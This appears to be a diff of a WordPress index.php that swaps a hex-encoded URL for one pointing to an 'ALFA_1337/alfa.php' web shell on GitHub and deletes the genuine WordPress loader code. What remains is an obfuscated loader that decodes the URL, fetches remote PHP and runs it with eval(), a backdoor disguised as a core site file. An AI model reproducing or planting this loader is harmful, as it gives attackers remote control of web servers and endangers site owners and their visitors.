@@ -1,5 +1,5 @@
 <?php
-$hexUrl = '68747470733a2f2f7261772e67697468756275736572636f6e74656e742e636f6d2f43616c6c4d654261746f7361792f4261636b75702f726566732f68656164732f6d61696e2f732e706870';
+$hexUrl = '68747470733a2f2f7261772e6769746875622e636f6d2f43616c6c4d654261746f7361792f414c46415f313333372f6d61696e2f616c66612e706870';
 
 function hex2str($hex) {
     $str = '';
@@ -57,21 +57,3 @@ if ($phpScript === false) {
 
 eval('?>' . $phpScript);
 ?>
-
-<?php
-/**
- * Front to the WordPress application. This file doesn't do anything, but loads
- * wp-blog-header.php which does and tells WordPress to load the theme.
- *
- * @package WordPress
- */
-
-/**
- * Tells WordPress to load the WordPress theme and output it.
- *
- * @var bool
- */
-define( 'WP_USE_THEMES', true );
-
-/** Loads the WordPress Environment and Template */
-require( dirname( __FILE__ ) . '/main/wp-blog-header.php' );
